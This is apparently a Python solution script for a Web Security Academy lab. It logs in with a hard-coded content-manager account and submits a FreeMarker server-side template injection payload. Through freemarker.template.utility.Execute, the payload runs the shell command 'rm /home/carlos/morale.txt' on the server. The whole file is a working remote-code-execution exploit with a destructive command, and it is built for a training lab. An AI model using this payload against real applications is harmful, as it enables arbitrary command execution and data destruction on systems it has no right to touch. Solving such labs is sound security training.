from web_security_academy.core.logger import logger


def solve_lab(session):
    session.login("content-manager", "C0nt3ntM4n4g3r")

    payload = (
        # FreeMarker (Java)
        '${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}'
    )
    data = {
        "csrf": session.get_csrf_token("/product/template?productId=1"),
        "template-action": "preview",
        "template": payload,
    }
    session.post_path("/product/template?productId=1", data=data)

    logger.info("Previewed a product description with the following template:")
    logger.info(payload)
